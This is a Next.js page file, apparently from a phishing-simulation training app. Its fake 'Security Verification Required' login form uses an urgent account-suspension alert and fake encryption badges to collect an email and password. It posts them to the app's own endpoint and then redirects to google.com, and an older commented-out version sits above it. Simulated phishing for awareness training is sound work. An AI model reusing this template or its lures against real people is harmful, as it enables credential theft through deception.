// //file: my-app/app/simulate/phishing/page.tsx
// 'use client';

// import { useSearchParams, useRouter } from 'next/navigation';
// import { useState, useEffect } from "react";
// import { Input } from "@/components/ui/input";
// import { Button } from "@/components/ui/button";
// import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
// import { toast } from "sonner";

// export default function PhishingLoginPage() {
//   const searchParams = useSearchParams();
//   const router = useRouter();
//   const [email, setEmail] = useState("");
//   const [password, setPassword] = useState("");
//   const [token, setToken] = useState<string | null>(null);

//   useEffect(() => {
//     const t = searchParams.get("token");
//     if (!t) {
//       toast.error("Invalid or missing token");
//       router.push("/");
//     } else {
//       setToken(t);
//     } 
//   }, [searchParams, router]);

//   const handleLogin = async (e: React.FormEvent) => {
//     e.preventDefault();

//     if (!token) {
//       toast.error("Missing campaign token.");
//       return;
//     }

//     try {
//       const res = await fetch("/api/phishing/submit", {
//         method: "POST",
//         headers: { "Content-Type": "application/json" },
//         body: JSON.stringify({ email, password, token }),
//       });

//       if (!res.ok) throw new Error();

//       toast.success("Credentials submitted.");
//       setEmail("");
//       setPassword("");
//       router.push("https://google.com"); // Redirect to real-looking site
//     } catch {
//       toast.error("Failed to submit credentials.");
//     }
//   };

//   return (
//     <main className="flex items-center justify-center min-h-screen bg-muted">
//       <Card className="w-full max-w-md">
//         <CardHeader>
//           <CardTitle>Secure Login</CardTitle>
//         </CardHeader>
//         <CardContent>
//           <form onSubmit={handleLogin} className="space-y-4">
//             <div>
//               <label htmlFor="email" className="block text-sm font-medium">Email address</label>
//               <Input
//                 id="email"
//                 type="email"
//                 placeholder="you@example.com"
//                 value={email}
//                 onChange={(e) => setEmail(e.target.value)}
//                 required
//               />
//             </div>
//             <div>
//               <label htmlFor="password" className="block text-sm font-medium">Password</label>
//               <Input
//                 id="password"
//                 type="password"
//                 placeholder="••••••••"
//                 value={password}
//                 onChange={(e) => setPassword(e.target.value)}
//                 required
//               />
//             </div>
//             <Button type="submit" className="w-full">Sign In</Button>
//           </form>
//         </CardContent>
//       </Card>
//     </main>
//   );
// }
"use client"

import type React from "react"

import { useSearchParams, useRouter } from "next/navigation"
import { useState, useEffect } from "react"
import { Input } from "@/components/ui/input"
import { Button } from "@/components/ui/button"
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card"
import { Alert, AlertDescription } from "@/components/ui/alert"
import { toast } from "sonner"
import { Shield, Lock, AlertTriangle } from "lucide-react"

export default function PhishingLoginPage() {
  const searchParams = useSearchParams()
  const router = useRouter()
  const [email, setEmail] = useState("")
  const [password, setPassword] = useState("")
  const [token, setToken] = useState<string | null>(null)
  const [isLoading, setIsLoading] = useState(false)

  useEffect(() => {
    const t = searchParams.get("token")
    if (!t) {
      toast.error("Invalid or missing security token")
      router.push("/")
    } else {
      setToken(t)
    }
  }, [searchParams, router])

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault()

    if (!token) {
      toast.error("Missing campaign token.")
      return
    }

    setIsLoading(true)
    try {
      const res = await fetch("/api/phishing/submit", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ email, password, token }),
      })

      if (!res.ok) throw new Error("Submission failed")

      toast.success("Account verification completed successfully")
      setEmail("")
      setPassword("")

      // Simulate redirect to legitimate site
      setTimeout(() => {
        window.location.href = "https://google.com"
      }, 1500)
    } catch (error) {
      toast.error("Verification failed. Please try again.")
      console.error(error)
    } finally {
      setIsLoading(false)
    }
  }

  if (!token) {
    return (
      <div className="flex items-center justify-center min-h-screen bg-slate-50">
        <div className="animate-spin rounded-full h-8 w-8 border-b-2 border-slate-900" />
      </div>
    )
  }

  return (
    <div className="min-h-screen bg-gradient-to-br from-slate-50 to-slate-100 flex items-center justify-center p-4">
      <div className="w-full max-w-md space-y-6">
        {/* Security Header */}
        <div className="text-center space-y-2">
          <div className="mx-auto w-16 h-16 bg-red-100 rounded-full flex items-center justify-center">
            <Shield className="h-8 w-8 text-red-600" />
          </div>
          <h1 className="text-2xl font-bold text-slate-900">Security Verification Required</h1>
          <p className="text-slate-600">Please verify your account to continue</p>
        </div>

        {/* Security Alert */}
        <Alert className="border-red-200 bg-red-50">
          <AlertTriangle className="h-4 w-4 text-red-600" />
          <AlertDescription className="text-red-800">
            <strong>Security Alert:</strong> Unusual activity detected on your account. Immediate verification required
            to prevent account suspension.
          </AlertDescription>
        </Alert>

        {/* Login Form */}
        <Card className="border-0 shadow-xl bg-white">
          <CardHeader className="space-y-1 pb-4">
            <div className="flex items-center gap-2">
              <Lock className="h-5 w-5 text-slate-600" />
              <CardTitle className="text-xl">Secure Account Verification</CardTitle>
            </div>
            <p className="text-sm text-slate-600">Enter your credentials to verify your identity</p>
          </CardHeader>
          <CardContent>
            <form onSubmit={handleLogin} className="space-y-4">
              <div className="space-y-2">
                <label htmlFor="email" className="text-sm font-medium text-slate-700">
                  Email Address
                </label>
                <Input
                  id="email"
                  type="email"
                  placeholder="you@example.com"
                  value={email}
                  onChange={(e) => setEmail(e.target.value)}
                  required
                  className="h-11"
                />
              </div>

              <div className="space-y-2">
                <label htmlFor="password" className="text-sm font-medium text-slate-700">
                  Password
                </label>
                <Input
                  id="password"
                  type="password"
                  placeholder="Enter your password"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  required
                  className="h-11"
                />
              </div>

              <Button
                type="submit"
                className="w-full h-11 bg-gradient-to-r from-red-600 to-red-700 hover:from-red-700 hover:to-red-800"
                disabled={isLoading}
              >
                {isLoading ? (
                  <>
                    <div className="animate-spin rounded-full h-4 w-4 border-b-2 border-white mr-2" />
                    Verifying Account...
                  </>
                ) : (
                  <>
                    <Lock className="mr-2 h-4 w-4" />
                    Verify Account
                  </>
                )}
              </Button>
            </form>

            <div className="mt-6 pt-4 border-t border-slate-200">
              <div className="flex items-center justify-center gap-2 text-xs text-slate-500">
                <Shield className="h-3 w-3" />
                <span>Secured by CyberSim Security</span>
              </div>
            </div>
          </CardContent>
        </Card>

        {/* Trust Indicators */}
        <div className="text-center space-y-2">
          <div className="flex items-center justify-center gap-4 text-xs text-slate-500">
            <div className="flex items-center gap-1">
              <div className="w-2 h-2 bg-green-500 rounded-full" />
              <span>SSL Secured</span>
            </div>
            <div className="flex items-center gap-1">
              <div className="w-2 h-2 bg-green-500 rounded-full" />
              <span>256-bit Encryption</span>
            </div>
          </div>
          <p className="text-xs text-slate-400">Your information is protected with enterprise-grade security</p>
        </div>
      </div>
    </div>
  )
}
